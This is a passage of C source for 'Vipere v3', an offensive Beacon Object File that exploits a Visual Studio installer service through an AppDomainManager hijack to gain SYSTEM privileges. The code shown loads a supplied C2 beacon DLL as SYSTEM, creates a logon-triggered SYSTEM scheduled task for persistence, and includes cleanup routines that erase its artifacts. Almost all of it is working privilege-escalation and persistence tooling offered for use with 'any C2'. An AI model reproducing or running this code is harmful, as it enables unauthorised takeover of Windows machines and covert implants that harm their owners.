    if (!StartServiceW(svc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err == 1056) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Service already running\n");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] Start failed: %d\n", err);
            CloseServiceHandle(svc); CloseServiceHandle(scm); return;
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Service RUNNING — beacon loaded as SYSTEM\n");
    }

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
}

static void DoPersist(char* payloadData, int payloadSize) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Vipere PERSIST\n");

    if (!payloadData || payloadSize < 1024) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No payload. Usage: persist <beacon.dll>\n");
        return;
    }

    if (!FExists(PERSIST_SRC)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] vs_installershell.exe not found — run prepare first\n");
        return;
    }

    // Create persist directory tree
    if (!DExists(L"C:\\ProgramData\\Microsoft\\VisualStudio"))
        CreateDirectoryW(L"C:\\ProgramData\\Microsoft\\VisualStudio", NULL);
    if (!DExists(PERSIST_DIR))
        CreateDirectoryW(PERSIST_DIR, NULL);

    // Copy legitimate .NET binary
    if (!FExists(PERSIST_EXE)) {
        if (!CopyFileW(PERSIST_SRC, PERSIST_EXE, FALSE)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Copy vs_installershell.exe failed: %d\n", GetLastError());
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Copied vs_installershell.exe to persist dir\n");
    }

    // Deploy AppDomainManager chain (fresh config, no original to merge)
    if (!DeployAppDomain(PERSIST_CFG, PERSIST_ADM, PERSIST_HDL, PERSIST_DIR,
                         payloadData, (DWORD)payloadSize, NULL)) {
        return;
    }

    // Create scheduled task
    wchar_t taskCmd[512];
    _snwprintf(taskCmd, 512,
        L"schtasks /create /tn \"%s\" /tr \"\\\"%s\\\"\" /sc onlogon /ru SYSTEM /f",
        TASK_NAME, PERSIST_EXE);
    taskCmd[511] = 0;

    if (RunProcess(taskCmd, 10000)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Scheduled task created (triggers at logon)\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] schtasks failed\n");
    }
}

static void DoFull(char* payloadData, int payloadSize) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Vipere FULL\n");
    if (DoPrepare()) {
        DoExploit(payloadData, payloadSize);
        DoPersist(payloadData, payloadSize);
    }
}

static void DoCleanup(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Vipere CLEANUP\n");

    wchar_t modPath[260];
    GetModuleFileNameW(NULL, modPath, 260);
    BOOL selfPersist = (wcsstr(modPath, L"vs_installershell") != NULL);

    // Stop service
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (scm) {
        SC_HANDLE svc = OpenServiceW(scm, SVC_NAME, SERVICE_STOP);
        if (svc) { SERVICE_STATUS ss; ControlService(svc, SERVICE_CONTROL_STOP, &ss); CloseServiceHandle(svc); }
        CloseServiceHandle(scm);
    }
    Sleep(1000);

    // Clean exploit artifacts
    DeleteFileW(HOST_DLL);
    DeleteFileW(ADM_DLL);
    if (FExists(SVC_CFG_BAK)) {
        DeleteFileW(SVC_CFG);
        MoveFileW(SVC_CFG_BAK, SVC_CFG);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Original .config restored\n");
    }

    if (!selfPersist) {
        wchar_t killCmd[128];
        wcscpy(killCmd, L"taskkill /f /im vs_installershell.exe");
        RunProcess(killCmd, 5000);
    }

    // Remove scheduled task
    wchar_t taskCmd[256];
    _snwprintf(taskCmd, 256, L"schtasks /delete /tn \"%s\" /f", TASK_NAME);
    taskCmd[255] = 0;
    RunProcess(taskCmd, 10000);

    // Clean persist files (locked files fail silently when running inside persist process)
    DeleteFileW(PERSIST_HDL);
    DeleteFileW(PERSIST_ADM);
    DeleteFileW(PERSIST_CFG);
    DeleteFileW(PERSIST_EXE);
    RemoveDirectoryW(PERSIST_DIR);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Scheduled task + persist dir removed\n");

    DeleteFileW(BOOTSTRAP_PATH);

    if (selfPersist) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] Beacon runs inside vs_installershell.exe — persist files locked\n"
            "[!] Kill this beacon, then: rmdir /s /q \"%ls\"\n", PERSIST_DIR);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Cleaned\n");
}

static void PrintHelp(void) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "Vipere v3 — VS Installer LPE via AppDomainManager hijack\n\n"
        "  check                    detect service + persistence state\n"
        "  prepare                  download + install VS BuildTools\n"
        "  exploit <beacon.dll>     hijack service → SYSTEM (no binary replace)\n"
        "  persist <beacon.dll>     scheduled task + AppDomainManager → reboot\n"
        "  full <beacon.dll>        prepare + exploit + persist\n"
        "  cleanup                  remove all artifacts + restore originals\n\n"
        "Payload: beacon DLL (any C2).\n");
}

// ============================================================================
// Entry points
// ============================================================================

#ifdef BOF

static BOOL ResolveAdvapi32(void) {
    HMODULE hAdv = KERNEL32$LoadLibraryA("advapi32.dll");
    if (!hAdv) {
        BeaconPrintf(CALLBACK_ERROR, "[-] LoadLibrary advapi32 failed\n");
        return FALSE;
    }
    pOpenSCManagerW       = (fn_OpenSCManagerW)KERNEL32$GetProcAddress(hAdv, "OpenSCManagerW");
    pOpenServiceW         = (fn_OpenServiceW)KERNEL32$GetProcAddress(hAdv, "OpenServiceW");
    pStartServiceW        = (fn_StartServiceW)KERNEL32$GetProcAddress(hAdv, "StartServiceW");
    pControlService       = (fn_ControlService)KERNEL32$GetProcAddress(hAdv, "ControlService");
    pCloseServiceHandle   = (fn_CloseServiceHandle)KERNEL32$GetProcAddress(hAdv, "CloseServiceHandle");

    if (!pOpenSCManagerW || !pOpenServiceW || !pStartServiceW ||
        !pControlService || !pCloseServiceHandle) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetProcAddress advapi32 failed\n");
        return FALSE;
    }
    return TRUE;
}

static BOOL ResolveWinHttp(void) {
    HMODULE hHttp = KERNEL32$LoadLibraryA("winhttp.dll");
    if (!hHttp) {
        BeaconPrintf(CALLBACK_ERROR, "[-] LoadLibrary winhttp failed\n");
        return FALSE;
    }
    pWinHttpOpen            = (fn_WinHttpOpen)KERNEL32$GetProcAddress(hHttp, "WinHttpOpen");
    pWinHttpConnect         = (fn_WinHttpConnect)KERNEL32$GetProcAddress(hHttp, "WinHttpConnect");
    pWinHttpOpenRequest     = (fn_WinHttpOpenRequest)KERNEL32$GetProcAddress(hHttp, "WinHttpOpenRequest");
    pWinHttpSendRequest     = (fn_WinHttpSendRequest)KERNEL32$GetProcAddress(hHttp, "WinHttpSendRequest");
    pWinHttpReceiveResponse = (fn_WinHttpReceiveResponse)KERNEL32$GetProcAddress(hHttp, "WinHttpReceiveResponse");
    pWinHttpQueryHeaders    = (fn_WinHttpQueryHeaders)KERNEL32$GetProcAddress(hHttp, "WinHttpQueryHeaders");
    pWinHttpReadData        = (fn_WinHttpReadData)KERNEL32$GetProcAddress(hHttp, "WinHttpReadData");
    pWinHttpCloseHandle     = (fn_WinHttpCloseHandle)KERNEL32$GetProcAddress(hHttp, "WinHttpCloseHandle");

    if (!pWinHttpOpen || !pWinHttpConnect || !pWinHttpOpenRequest ||
        !pWinHttpSendRequest || !pWinHttpReceiveResponse || !pWinHttpQueryHeaders ||
        !pWinHttpReadData || !pWinHttpCloseHandle) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetProcAddress winhttp failed\n");
        return FALSE;
    }
    return TRUE;
}

extern "C" void go(char* args, int len) {
    if (!ResolveAdvapi32()) return;

    datap parser; BeaconDataParse(&parser, args, len);
    char* method = BeaconDataExtract(&parser, NULL);
    if (!method || !method[0]) { PrintHelp(); return; }

    wchar_t wm[32];
    for (int i = 0; method[i] && i < 31; i++) { wm[i] = (wchar_t)method[i]; wm[i+1] = 0; }

    if (_wcsicmp(wm, L"check") == 0) DoCheck();
    else if (_wcsicmp(wm, L"prepare") == 0) {
        if (ResolveWinHttp()) DoPrepare();
    }
    else if (_wcsicmp(wm, L"exploit") == 0) {
        int sz = 0; char* p = BeaconDataExtract(&parser, &sz);
        DoExploit(p, sz);
    }
    else if (_wcsicmp(wm, L"persist") == 0) {
        int sz = 0; char* p = BeaconDataExtract(&parser, &sz);
        DoPersist(p, sz);
    }
    else if (_wcsicmp(wm, L"full") == 0) {
        if (ResolveWinHttp()) {
            int sz = 0; char* p = BeaconDataExtract(&parser, &sz);
            DoFull(p, sz);
        }
    }
    else if (_wcsicmp(wm, L"cleanup") == 0) DoCleanup();
    else { BeaconPrintf(CALLBACK_ERROR, "[-] Unknown: %s\n", method); PrintHelp(); }
}

#else
int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) { PrintHelp(); return 1; }
    if (_wcsicmp(argv[1], L"check") == 0) DoCheck();
    else if (_wcsicmp(argv[1], L"prepare") == 0) DoPrepare();
    else if (_wcsicmp(argv[1], L"cleanup") == 0) DoCleanup();
    else if (_wcsicmp(argv[1], L"exploit") == 0 || _wcsicmp(argv[1], L"persist") == 0 ||
             _wcsicmp(argv[1], L"full") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] EXE mode: exploit/persist/full need BOF with payload\n");
    }
    else { BeaconPrintf(CALLBACK_ERROR, "Unknown: %ls\n", argv[1]); return 1; }
    return 0;
}
#endif
